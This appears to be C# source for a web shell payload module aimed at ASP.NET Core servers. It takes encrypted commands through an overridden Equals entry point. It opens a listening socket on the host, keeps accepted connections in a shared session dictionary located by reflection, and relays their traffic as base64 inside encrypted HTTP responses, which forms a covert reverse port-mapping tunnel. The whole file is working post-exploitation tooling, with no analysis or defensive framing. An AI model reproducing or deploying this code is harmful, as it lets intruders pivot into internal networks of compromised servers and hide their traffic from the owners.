using System.Net;
using System.Net.Sockets;
using Microsoft.AspNetCore.Http;
using System.Reflection;
using System.Text;
using System.Security.Cryptography;

public class U
{
    public HttpRequest Request;
    public HttpResponse Response;
    public ISession Session;


    public string content;

    public string sessionId;


    private DefaultHttpContext context;

    private object current;

    public Dictionary<string, Object> globals = new Dictionary<string, Object>();

    public string error_msg;


    public static string action;


    public static string listenPort;


    public static string socketHash;


    public static string extraData;


    private class StateObject
    {
        public const int BUFFER_SIZE = 1024;


        public Socket workSocket = null;


        public byte[] buffer = new byte[1024];
    }

    public override bool Equals(object obj)
    {
        this.init(obj);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        try
        {
            if (U.action.Equals("create"))
            {
                try
                {
                    Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    socket.Bind(new IPEndPoint(IPAddress.Any, int.Parse(U.listenPort)));
                    socket.Listen(50);
                    dictionary2.Add("listenPort", U.listenPort);
                    string text = "reverseportmap_server_" + U.listenPort;
                    dictionary2.Add("serverSocketHash", text);
                    this.sessionSet(text, socket);
                    new Thread(new ParameterizedThreadStart(this.createDaemons)).Start(dictionary2);
                    dictionary.Add("status", "success");
                    dictionary.Add("msg", "success");
                }
                catch (Exception ex)
                {
                    dictionary.Add("status", "fail");
                    dictionary.Add("msg", ex.Message);
                }

                this.Response.WriteAsync(Encoding.UTF8.GetString(this.EnjsonAndCrypt(dictionary)));
            }
            else if (U.action.Equals("list"))
            {
                List<Dictionary<string, string>> list = new List<Dictionary<string, string>>();
                foreach (string text2 in this.sessionKeys())
                {
                    if (text2.IndexOf("reverseportmap") >= 0)
                    {
                        list.Add(new Dictionary<string, string> { { "socketHash", text2 } });
                    }
                }

                dictionary.Add("status", "success");
                dictionary.Add("msg", this.DictList2Json(list));
                this.Response.WriteAsync(Encoding.UTF8.GetString(this.EnjsonAndCrypt(dictionary)));
            }
            else if (U.action.Equals("read"))
            {
                Dictionary<string, string> dictionary3 = new Dictionary<string, string>();
                Socket socket2 = (Socket)this.sessionGet(U.socketHash);
                byte[] array = new byte[512];
                try
                {
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        using (BinaryWriter binaryWriter = new BinaryWriter(memoryStream))
                        {
                            while (socket2.Available > 0)
                            {
                                int num = socket2.Receive(array);
                                binaryWriter.Write(array, 0, num);
                            }

                            dictionary3.Add("status", "success");
                            dictionary3.Add("msg", Convert.ToBase64String(memoryStream.ToArray()));
                        }
                    }
                }
                catch (SocketException ex2)
                {
                    dictionary3.Add("status", "fail");
                    dictionary3.Add("msg", ex2.Message);
                }

                this.Response.WriteAsync(Encoding.UTF8.GetString(this.EnjsonAndCrypt(dictionary3)));
            }
            else if (U.action.Equals("write"))
            {
                Dictionary<string, string> dictionary3 = new Dictionary<string, string>();
                Socket socket2 = (Socket)this.sessionGet(U.socketHash);
                try
                {
                    byte[] array2 = Convert.FromBase64String(U.extraData);
                    socket2.Send(array2);
                    dictionary3.Add("status", "success");
                    dictionary3.Add("msg", "ok");
                }
                catch (Exception ex3)
                {
                    dictionary3.Add("status", "fail");
                    dictionary3.Add("msg", ex3.Message);
                }

                this.Response.WriteAsync(Encoding.UTF8.GetString(this.EnjsonAndCrypt(dictionary3)));
            }
            else if (U.action.Equals("stop"))
            {
                foreach (string text3 in this.sessionKeys())
                {
                    if (text3.StartsWith("reverseportmap_socket_" + U.listenPort))
                    {
                        try
                        {
                            Socket socket2 = (Socket)this.sessionGet(text3);
                            this.sessionRemove(text3);
                            socket2.Close();
                        }
                        catch (Exception)
                        {
                        }
                    }
                }

                try
                {
                    string text = "reverseportmap_server_" + U.listenPort;
                    Socket socket = (Socket)this.sessionGet(text);
                    this.sessionRemove(text);
                    socket.Close();
                }
                catch (Exception)
                {
                }

                dictionary.Add("status", "success");
                dictionary.Add("msg", "服务侧Socket资源已释放。");
                this.Response.WriteAsync(Encoding.UTF8.GetString(this.EnjsonAndCrypt(dictionary)));
            }
            else if (U.action.Equals("close"))
            {
                try
                {
                    Socket socket2 = (Socket)this.sessionGet(U.socketHash);
                    this.sessionRemove(U.socketHash);
                    socket2.Close();
                }
                catch (Exception)
                {
                }

                dictionary.Add("status", "success");
                dictionary.Add("msg", "服务侧Socket资源已释放。");
                this.Response.WriteAsync(Encoding.UTF8.GetString(this.EnjsonAndCrypt(dictionary)));
            }
        }
        catch (Exception ex3)
        {
            dictionary.Add("status", "fail");
            dictionary.Add("msg", ex3.Message);
            this.Response.WriteAsync(Encoding.UTF8.GetString(this.EnjsonAndCrypt(dictionary)));
        }

        return true;
    }


    private string DictList2Json(List<Dictionary<string, string>> list)
    {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append("[");
        foreach (Dictionary<string, string> dictionary in list)
        {
            stringBuilder.Append("{");
            foreach (string text in dictionary.Keys)
            {
                stringBuilder.Append("\"" + text + "\":\"");
                stringBuilder.Append(dictionary[text] + "\",");
            }

            stringBuilder.Remove(stringBuilder.Length - 1, 1);
            stringBuilder.Append("},");
        }

        if (stringBuilder.ToString().EndsWith(","))
        {
            stringBuilder.Remove(stringBuilder.Length - 1, 1);
        }

        stringBuilder.Append("]");
        return stringBuilder.ToString();
    }


    public void readCallback(IAsyncResult ar)
    {
        U.StateObject stateObject = (U.StateObject)ar.AsyncState;
        Socket workSocket = stateObject.workSocket;
        int num = workSocket.EndReceive(ar);
        if (num > 0)
        {
            byte[] array = new byte[num];
            Buffer.BlockCopy(stateObject.buffer, 0, array, 0, num);
            this.Response.WriteAsync(Encoding.UTF8.GetString(array));
        }
    }


    private void createDaemons(object paramsMapObj)
    {
        Dictionary<string, object> dictionary = (Dictionary<string, object>)paramsMapObj;
        try
        {
            StreamWriter streamWriter = new StreamWriter("c:\\windows\\temp\\error0.txt");
            streamWriter.WriteLine("in thread");
            streamWriter.Flush();
            streamWriter.Close();
            string text = dictionary["listenPort"].ToString();
            string text2 = dictionary["serverSocketHash"].ToString();
            Socket socket = (Socket)this.sessionGet(text2);
            for (;;)
            {
                try
                {
                    streamWriter = new StreamWriter("c:\\windows\\temp\\error2.txt");
                    streamWriter.WriteLine("in true");
                    streamWriter.Flush();
                    streamWriter.Close();
                    Socket socket2 = socket.Accept();
                    socket2.Blocking = false;
                    streamWriter = new StreamWriter("c:\\windows\\temp\\error3.txt");
                    streamWriter.WriteLine("socket:" + socket2.ToString());
                    streamWriter.Flush();
                    streamWriter.Close();
                    string text3 = string.Concat(new object[]
                    {
                        "reverseportmap_socket_",
                        text,
                        "_",
                        ((IPEndPoint)socket2.RemoteEndPoint).Address.ToString(),
                        "_",
                        ((IPEndPoint)socket2.RemoteEndPoint).Port
                    });
                    streamWriter = new StreamWriter("c:\\windows\\temp\\error5.txt");
                    streamWriter.WriteLine("serverInnersocketHash:" + text3);
                    streamWriter.Flush();
                    streamWriter.Close();
                    this.sessionSet(text3, socket2);
                }
                catch (Exception ex)
                {
                    streamWriter = new StreamWriter("c:\\windows\\temp\\error4.txt");
                    streamWriter.WriteLine(ex.Message + ex.StackTrace);
                    streamWriter.Flush();
                    streamWriter.Close();
                    break;
                }
            }
        }
        catch (Exception ex)
        {
            StreamWriter streamWriter = new StreamWriter("c:\\windows\\temp\\error5.txt");
            streamWriter.WriteLine(ex.Message + ex.StackTrace);
            streamWriter.Flush();
            streamWriter.Close();
        }
    }

    private void sessionSet(string key, object value)
    {
        string sessionKey = this.Session?.Id ?? this.sessionId;


        Dictionary<string, object> dictionary = (Dictionary<string, object>)this.globals[sessionKey];


        if (dictionary.ContainsKey(key))
        {
            dictionary[key] = value;
        }
        else
        {
            dictionary.Add(key, value);
        }
    }


    private List<string> sessionKeys()
    {
        List<string> list = new List<string>();
        if (this.Session == null)
        {
            list.AddRange(((Dictionary<string, object>)this.globals[this.sessionId]).Keys);
        }
        else
        {
            list.AddRange(((Dictionary<string, object>)this.globals[this.Session.Id]).Keys);
        }

        return list;
    }


    private object sessionGet(string key)
    {
        object obj;
        if (this.Session == null)
        {
            obj = ((Dictionary<string, object>)this.globals[this.sessionId])[key];
        }
        else
        {
            obj = ((Dictionary<string, object>)this.globals[this.Session.Id])[key];
        }

        return obj;
    }


    private void sessionRemove(string key)
    {
        if (this.Session == null)
        {
            ((Dictionary<string, object>)this.globals[this.sessionId]).Remove(key);
        }
        else
        {
            ((Dictionary<string, object>)this.globals[this.Session.Id]).Remove(key);
        }
    }

    private byte[] EnjsonAndCrypt(Dictionary<string, string> result)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(this.Dict2Json(result));
        return this.Encrypt(bytes);
    }

    private string Dict2Json(Dictionary<string, string> dict)
    {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append("{");
        foreach (string text in dict.Keys)
        {
            stringBuilder.Append("\"" + text + "\":\"");
            stringBuilder.Append(Convert.ToBase64String(Encoding.UTF8.GetBytes(dict[text])) + "\",");
        }

        if (stringBuilder.ToString().EndsWith(","))
        {
            stringBuilder.Remove(stringBuilder.Length - 1, 1);
        }

        stringBuilder.Append("},");
        stringBuilder.Remove(stringBuilder.Length - 1, 1);
        return stringBuilder.ToString();
    }

    private void global()
    {
        Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();


        string targetAssemblyFullName = "Echo, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null";
        var targetAssembly =
            assemblies.FirstOrDefault(assembly => assembly.GetName().FullName.Equals(targetAssemblyFullName));

        if (targetAssembly != null)
        {
            string targetTypeName = "U";
            Type targetType = targetAssembly.GetType(targetTypeName);

            if (targetType != null)
            {
                object instance = Activator.CreateInstance(targetType);
                FieldInfo instancesField =
                    instance.GetType().GetField("globals", BindingFlags.Static | BindingFlags.Public);
                globals = instancesField.GetValue(null) as Dictionary<string, object>;
            }
        }
    }

    private void init(object obj)
    {
        /*
         * .net core中重构体系，所以HttpContext.Current不存在类似的
         */
        global();
        this.current = obj;
        this.fillRequestHandler(obj);
        this.fillParams();
        this.fillSessionHandler();
    }


    private void fillRequestHandler(object obj)
    {
        this.context = (DefaultHttpContext)obj;
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8";
    }

    private void fillSessionHandler()
    {
        try
        {
            this.Session = ((HttpContext)this.context).Session;

            this.Session.Set("test", Encoding.UTF8.GetBytes("test"));

            if (!globals.ContainsKey(this.Session.Id))
            {
                if (globals != null)
                {
                    globals[this.Session.Id] = new Dictionary<string, object>();
                }
            }
        }
        catch (Exception ex)
        {
            if (this.sessionId != null)
            {
                if (!globals.ContainsKey(this.sessionId))
                {
                    if (globals != null)
                    {
                        globals[this.sessionId] = new Dictionary<string, object>();
                    }
                }
            }
            else
            {
                error_msg = ex.Message;
            }
        }
    }


    public void fillParams()
    {
        using (var memoryStream = new MemoryStream())
        {
            context.Request.Body.Seek(0, SeekOrigin.Begin);
            context.Request.Body.CopyTo(memoryStream);


            memoryStream.Seek(0, SeekOrigin.Begin);


            byte[] array = memoryStream.ToArray();


            array = Decrypt(array);


            Dictionary<string, string> extraData = getExtraData(array);


            if (extraData != null)
            {
                foreach (var key in extraData.Keys)
                {
                    var field = this.GetType().GetField(key);
                    if (field != null)
                    {
                        field.SetValue(this, extraData[key]);
                    }
                }
            }
        }
    }

    private byte[] Encrypt(byte[] data)
    {
        var EncryptFunc = ((DefaultHttpContext)current).Items["EncryptFunc"];
        MethodInfo method = (MethodInfo)EncryptFunc.GetType().GetProperty("Method").GetValue(EncryptFunc);


        byte[] array;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            array = new RijndaelManaged().CreateEncryptor(bytes, bytes).TransformFinalBlock(data, 0, data.Length);
        }
        else
        {
            array = (byte[])method.Invoke(null, new object[] { data });
        }

        return array;
    }

    private byte[] Decrypt(byte[] data)
    {
        var DecryptFunc = ((DefaultHttpContext)current).Items["DecryptFunc"];
        MethodInfo method = (MethodInfo)DecryptFunc.GetType().GetProperty("Method").GetValue(DecryptFunc);

        byte[] result;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = bytes;
                aesAlg.IV = bytes;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                result = decryptor.TransformFinalBlock(data, 0, data.Length);
            }
        }
        else
        {
            result = (byte[])method.Invoke(null, new object[] { data });
        }

        return result;
    }

    private Dictionary<string, string> getExtraData(byte[] fullData)
    {
        this.context.Request.Body.Seek(0, SeekOrigin.Begin);
        int num = this.IndexOf(fullData, new byte[] { 126, 126, 126, 126, 126, 126 });
        byte[] array = new List<byte>(fullData).GetRange(num + 6, fullData.Length - num - 6).ToArray();
        string @string = Encoding.Default.GetString(array);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        string[] array2 = @string.Split(new char[] { ',' });
        string[] array3 = array2;
        foreach (string text in array3)
        {
            string[] array5 = text.Split(new char[] { ':' });
            if (array5.Length == 2)
            {
                string text2 = array5[0];
                string string2 = Encoding.UTF8.GetString(Convert.FromBase64String(array5[1]));
                dictionary.Add(text2, string2);
            }
        }

        return dictionary;
    }


    internal int IndexOf(byte[] srcBytes, byte[] searchBytes)
    {
        int num = 0;
        int result;
        if (srcBytes == null)
        {
            result = -1;
        }
        else if (searchBytes == null)
        {
            result = -1;
        }
        else if (srcBytes.Length == 0)
        {
            result = -1;
        }
        else if (searchBytes.Length == 0)
        {
            result = -1;
        }
        else if (srcBytes.Length < searchBytes.Length)
        {
            result = -1;
        }
        else
        {
            for (int i = 0; i < srcBytes.Length - searchBytes.Length; i++)
            {
                if (srcBytes[i] == searchBytes[0])
                {
                    if (searchBytes.Length == 1)
                    {
                        return i;
                    }

                    bool flag = true;
                    for (int j = 1; j < searchBytes.Length; j++)
                    {
                        if (srcBytes[i + j] != searchBytes[j])
                        {
                            flag = false;
                            break;
                        }
                    }

                    if (flag)
                    {
                        num++;
                        if (num == 2)
                        {
                            return i;
                        }
                    }
                }
            }

            result = -1;
        }

        return result;
    }

    private void fillRequest(object obj)
    {
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8";
    }

    private void fillSession()
    {
        try
        {
            this.Session = this.context.Session;
        }
        catch (Exception)
        {
            if (!context.Items.ContainsKey(this.context.Session.Id) ||
                this.context.Items[this.context.Session.Id] == null)
            {
                this.context.Items[this.context.Session.Id] = new Dictionary<string, object>();
            }
        }
    }
}